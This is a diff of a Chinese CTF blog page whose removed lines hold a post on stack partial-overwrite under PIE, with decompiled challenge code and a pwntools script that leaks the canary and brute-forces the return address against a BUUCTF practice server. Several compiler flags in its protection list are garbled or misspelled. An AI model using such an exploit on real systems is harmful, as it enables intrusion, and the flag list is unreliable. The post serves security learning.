-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="rootzhang">
-      <meta itemprop="description" content="我的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="study">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/" class="post-title-link" itemprop="url">栈暂时就到这了</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-06 15:51:04 / 修改时间：15:51:29" itemprop="dateCreated datePublished" datetime="2021-11-06T15:51:04+08:00">2021-11-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="栈上的Partial-Overwrite"><a href="#栈上的Partial-Overwrite" class="headerlink" title="栈上的Partial-Overwrite"></a>栈上的Partial-Overwrite</h2><p>原理：对于开了PIE保护的程序，每次的指令地址都是随机的，但是地址的最后十二位总是固定的，也就是ida对于的地址，我们只要修改最后十二位地址，就可以控制程序流程了，但是修改数据只能整字节修改，无法直接修改12位，所以一般都是直接修改两个字节，对于第十二位到第十六位就一个一个试，比如一个函数的地址是0x30a，我们想要程序跳到这里，可以这样构造/x0a/xy3,y属于0到f，一个一个试，总会对的。或者固定一个值，让程序连接多次，16分之一的概率。</p>
-<p>例题：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看见这个程序还有canary保护，read函数碰到\0会停止读取，我们只要一直覆盖到canary处就可以了，不过要加1，因为canary最后一个字节是\x00，也得把他覆盖掉才行。</p>
-<p>最后payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29355</span>)</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./babypie&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Input your Name:&#x27;</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        canary=<span class="string">&#x27;\0&#x27;</span>+sh.recvn(<span class="number">7</span>)</span><br><span class="line">        sleep(<span class="number">0.3</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+canary+<span class="string">&#x27;bbbbbbbb&#x27;</span>+<span class="string">&#x27;\x3e\x0a&#x27;</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>
-
-<p>循环的原因就是y不确定，所以假设为0,如果程序真为0就会控制成功，如果不成功就会再连接一次</p>
-<p>顺便来补一个程序保护</p>
-<h2 id="Pwn保护说明"><a href="#Pwn保护说明" class="headerlink" title="Pwn保护说明"></a>Pwn保护说明</h2><h3 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch:"></a>1.Arch:</h3><p>说明程序的架构，位数，和是大端序还是小端序</p>
-<h3 id="2-RELR："><a href="#2-RELR：" class="headerlink" title="2.RELR："></a>2.RELR：</h3><p>设置符号重定位表为只读或者在程序启动时就解析所有动态符号，从二建扫对got表的攻击</p>
-<p>编译选项：关闭： -z morello  开启部分：-z lazy 开启全部：-z now</p>
-<h3 id="stack"><a href="#stack" class="headerlink" title="stack:"></a>stack:</h3><p>栈保护溢出</p>
-<p>编译选项：关闭：-fon-stack-protector 开启：-fstack_protector-all</p>
-<h3 id="NX"><a href="#NX" class="headerlink" title="NX:"></a>NX:</h3><p>堆栈不可执行</p>
-<p>编译选项：关闭-z execstack 开启：-z noexecstack</p>
-<h3 id="PIE："><a href="#PIE：" class="headerlink" title="PIE："></a>PIE：</h3><p>内存地址随机化（linux下pie启动必须同时开始aslr）</p>
-<p>编译选项：关闭 -no-pie 开启 -pie ifPIC</p>
-<h3 id="RWX"><a href="#RWX" class="headerlink" title="RWX:"></a>RWX:</h3><p>bss段可执行</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1212,7 +1274,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
